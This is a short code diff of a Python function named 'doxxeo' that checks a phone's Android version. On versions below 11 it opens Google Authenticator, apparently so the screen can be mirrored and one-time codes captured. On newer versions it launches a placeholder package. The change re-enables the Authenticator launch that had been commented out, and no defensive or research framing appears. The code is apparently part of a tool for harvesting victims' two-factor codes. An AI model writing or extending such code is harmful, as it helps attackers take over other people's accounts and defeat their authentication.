@@ -50,12 +50,12 @@ def doxxeo():
             android_version_int = int(version_android)
             if android_version_int >= 11:
                 print("No es posible duplicar la pantalla de Google Authenticator.")
-            else:
-                #app_package_name = "com.google.android.apps.authenticator2" # Package name of the app you want to open
                 app_package_name = "com.example.Gen"
-                time.sleep(2)
-                launch_app(app_package_name) # Launch the specific app
-                return True
+            else:
+                app_package_name = "com.google.android.apps.authenticator2" # Package name of the app you want to open
+            time.sleep(2)
+            launch_app(app_package_name)
+            return True
         except ValueError:
             print("La versión de Android no es un número válido.")
     else:
